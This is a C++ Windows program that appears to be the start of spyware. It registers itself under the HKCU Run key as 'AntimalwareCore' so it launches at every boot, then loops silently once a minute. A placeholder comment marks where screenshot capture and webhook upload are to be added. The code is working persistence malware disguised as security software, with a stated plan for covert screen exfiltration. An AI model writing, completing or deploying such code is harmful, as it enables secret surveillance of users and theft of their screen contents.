#include <windows.h>
#include <gdiplus.h>
#include <wininet.h>
#include <shlobj.h>
#include <string>

#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "shlwapi.lib")

using namespace Gdiplus;

// Function to handle persistence (Auto-start on boot)
void EnsurePersistence() {
    char szPath[MAX_PATH];
    if (GetModuleFileNameA(NULL, szPath, MAX_PATH)) {
        HKEY hKey;
        const char* czStartName = "AntimalwareCore";
        const char* czContext = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
        
        // Open the "Run" registry key for the current user
        if (RegOpenKeyExA(HKEY_CURRENT_USER, czContext, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
            // Set the value to point to our current EXE path
            RegSetValueExA(hKey, czStartName, 0, REG_SZ, (BYTE*)szPath, strlen(szPath) + 1);
            RegCloseKey(hKey);
        }
    }
}

int APIENTRY WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
    // 1. Instantly ensure we start with Windows next time
    EnsurePersistence();

    // 2. Initialize GDI+
    GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

    // 3. Main Logic Loop (Silent Background)
    while (true) {
        // [Add your Screenshot/Webhook logic here later]
        Sleep(60000); // 1 minute cycles
    }

    GdiplusShutdown(gdiplusToken);
    return 0;
}
